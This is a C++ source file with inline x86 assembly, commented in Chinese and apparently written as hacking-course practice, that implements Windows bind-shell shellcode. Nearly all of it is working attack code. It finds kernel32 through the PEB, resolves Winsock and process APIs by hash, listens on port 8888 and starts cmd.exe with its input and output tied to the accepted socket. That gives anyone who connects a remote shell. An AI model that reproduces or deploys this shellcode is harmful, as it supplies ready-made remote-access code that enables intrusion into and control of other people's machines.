#include<windows.h>
#include<iostream>
void _declspec(naked)shellCode()
{

	__asm
	{
		//ws2_32.dll 77 73 32 5F 33 32 2E 64  6C 6C  00    长度：0xB
		// cmd.exe 63 6D 64 2E 65 78 65 00长度：0x8
		// kernel32.dll 6B 65 72 6E   65 6C 33 32   2E 64 6C 6C   00
		//LoadLibraryA 0XC917432
		//WSAStartup 0x80B46A3D
		// WSASocketA 0xDE78322D
		// bind 0XDDA71064
		// listen 0x4BD39F0C
		// accept 0X1971EB1
		// CreateProcessA 0X6BA6BCC9
		//ExitProcess 0x4FD18963
		//1.保存字符串信息
		push ebp
		mov ebp, esp
		sub esp, 0x30
		//kernel32.dll
		mov byte ptr ds : [ebp - 1] , 0x0
		mov dword ptr[ebp - 0x5], 0x6C6C642E
		mov dword ptr[ebp - 0x9], 0x32336C65
		mov dword ptr[ebp - 0xD], 0x6E72656B
		//cmd.exe
		mov dword ptr[ebp - 0x11], 0x00657865
		mov dword ptr[ebp - 0x15], 0x2e646d63

		//ws2_32.dll
		mov byte ptr[ebp - 0x16], 0
		mov word ptr[ebp - 0x18], 0x6c6c
		mov dword ptr[ebp - 0x1C], 0x642e3233
		mov dword ptr[ebp - 0x20], 0x5f327377

		mov ecx, esp
		lea ecx, [ecx + 0x10]
		push ecx
		call fun_payload
		//popad
		//2.获取模块基址
		fun_GetModule :
		push ebp
			mov ebp, esp
			sub esp, 0xc
			push esi
			mov esi, dword ptr fs : [0x30]//PEB指针
			mov esi, [esi + 0xc]//LDR结构体地址
			mov esi, [esi + 0x1c]//list
			mov esi, [esi]//list的第二项 kernel32
			mov esi, [esi + 0x8]//dllbase
			mov eax, esi
			pop esi
			mov esp, ebp
			pop ebp
			retn
			fun_GetProcAddr :
		push ebp
			mov ebp, esp
			sub esp, 0x20
			push esi
			push edi
			push edx
			push ebx
			push ecx

			mov edx, [ebp + 0X8]//dllbase
			mov esi, [edx + 0x3c]//lf_anew
			lea esi, [edx + esi]//Nt头
			mov esi, [esi + 0x78]//导出表RVA
			lea esi, [edx + esi]//导出表VA
			mov edi, [esi + 0x1c]//EAT RVA
			lea edi, [edx + edi]//EAT VA
			mov[ebp - 0x4], edi//eatva
			mov edi, [esi + 0x20]//ENT RVA
			lea edi, [edx + edi]//ENT va
			mov[ebp - 0x8], edi//ENTVA
			mov edi, [esi + 0x24]//EOT RVA
			lea edi, [edx + edi]//
			mov[ebp - 0xc], edi//EOTVA
			//比较字符串获取API
			xor eax, eax
			xor ebx, ebx
			cld
			jmp tag_cmpfirst
			tag_cmpLoop :
		inc ebx
			tag_cmpfirst :
		mov esi, [ebp - 0x8]//ENT
			mov esi, [esi + ebx * 4]//RVA
			lea esi, [edx + esi]//函数名称字符串
			mov edi, [ebp + 0xc]//要查找的目标函数名称

			push esi//传参
			call fun_GetHashCode//获取ENT函数名称的哈希值
			cmp edi, eax
			jne tag_cmpLoop

			mov esi, [ebp - 0xc]//eot
			xor edi, edi//为了不影响结果清空edi
			mov di, [esi + ebx * 2]//eat表索引
			mov edx, [ebp - 0x4]//eat
			mov esi, [edx + edi * 4]//函数地址rva
			mov edx, [ebp + 0x8]//dllbase
			lea eax, [edx + esi]//funaddr va

			pop ecx
			pop ebx
			pop edx
			pop edi
			pop esi
			mov esp, ebp
			pop ebp
			retn 0x8

			fun_GetHashCode:
		push ebp
			mov ebp, esp
			sub esp, 0X4
			push ecx
			push edx
			push ebx
			mov dword ptr[ebp - 0x4], 0
			mov esi, [ebp + 0x8]
			xor ecx, ecx
			tag_hashLoop :
		xor eax, eax
			mov al, [esi + ecx]
			test al, al
			jz tag_end
			mov ebx, [ebp - 0x4]
			shl ebx, 0x19
			mov edx, [ebp - 0x4]
			shr edx, 0x7
			or ebx, edx
			add ebx, eax
			mov[ebp - 0x4], ebx
			inc ecx//ecx++
			jmp tag_hashLoop
			tag_end :
		mov eax, [ebp - 0x4]
			pop ebx
			pop edx
			pop ecx
			mov esp, ebp
			pop ebp
			retn 0x4

			//payload
			fun_payload:
		push ebp
			mov ebp, esp
			sub esp, 0x300
			//1.先拿到dllbase
			call fun_GetModule
			//2.获取LoadLibraryA
			push 0XC917432//LoadLibraryA 哈希值
			push eax
			call fun_GetProcAddr
			mov[ebp - 0x4], eax//LoadLibraryA 地址
			//3.调用LoadLibraryA 加载ws2_32.dll
			mov ecx, [ebp + 0x8]//ws2_32.dll字符串地址
			push  ecx
			call[ebp - 0x4]//调用loadlibraya获取 ws2_32.dll
			mov[ebp - 0x8], eax//ws2_32base
			//4.获取kernel32.dll模块基址
			mov ecx, [ebp + 0x8]//kernel32.dll字符串地址
			lea ecx, [ecx + 0x13]
			push  ecx
			call[ebp - 0x4]//调用loadlibraya获取 kernel32.dll
			mov[ebp - 0xc], eax//kernel32base

			//获取WSAStartup地址
			push 0x80B46A3D//WSAStartup 哈希值
			push[ebp - 0x8]//ws2_32 基址
			call fun_GetProcAddr

			lea esi, [ebp - 0x300]//WSADATA 结构体
			push esi
			push 0x0202
			call eax
			//获取 WSASocketA 地址并调用
			push 0xDE78322D//WSASocketA 哈希值
			push[ebp - 0x8]//ws2_32 基址
			call fun_GetProcAddr
			//调用WSASocketA
			push 0
			push 0
			push 0
			push 0x6
			push 0x1
			push 0x2
			call  eax
			mov[ebp - 0x10], eax//socket

			//查找bind 并调用
			//获取 bind 地址并调用
			push 0XDDA71064//bind 哈希值
			push[ebp - 0x8]//ws2_32 基址
			call fun_GetProcAddr



			mov word ptr[ebp - 0x200], 0x2
			mov word ptr[ebp - 0x1FE], 0XB822//22B8 8888 大端序
			mov dword ptr[ebp - 0x1FC], 0
			push 0x10//sizeof(SOCKADDR_IN)
			lea esi, [ebp - 0x200]//&SOCKADDR_IN
			push esi
			push[ebp - 0x10]//socket
			call eax
			//获取listen地址 并调用
			push 0x4BD39F0C//listen 哈希值
			push[ebp - 0x8]//ws2_32 基址
			call fun_GetProcAddr
			push 0x7FFFFFFF
			push[ebp - 0x10]//socket
			call eax
			//获取accept 并调用
			push 0X1971EB1//listen 哈希值
			push[ebp - 0x8]//ws2_32 基址
			call fun_GetProcAddr
			push 0
			push 0
			push[ebp - 0x10]
			call eax
			mov[ebp - 0x10], eax

			//初始化STARTUPINFOA结构体
			lea edi, [ebp - 0x90]//STARTUPINFOA结构体首地址
			xor eax, eax
			mov ecx, 0x11
			cld
			rep stosd
			mov dword ptr[ebp - 0x90], 0x44//sinfo.cb
			mov dword ptr[ebp - 0x64], 0x100//sinfo.dwFlags
			mov word ptr[ebp - 0x60], 0x0//sinfo.wShowWindow
			mov esi, [ebp - 0x10]//socket
			mov dword ptr[ebp - 0x58], esi
			mov dword ptr[ebp - 0x54], esi
			mov dword ptr[ebp - 0x50], esi
			//获取CreateProcessA 并调用
			push 0X6BA6BCC9//CreateProcessA 哈希值
			push[ebp - 0xC]//kener32 基址
			call fun_GetProcAddr

			lea edi, [ebp - 0x200]
			lea esi, [ebp - 0x90]
			mov ecx, [ebp + 0x8]
			lea ecx, [ecx + 0xB]
			push edi
			push esi
			push 0
			push 0
			push 0
			push 1
			push 0
			push 0
			push ecx
			push 0
			call eax//CreateProcessA

			mov esp, ebp
			pop ebp
			retn 0x4
	}
}
int main2()
{
	printf("hello 51hook");
	shellCode();
	return 0;
}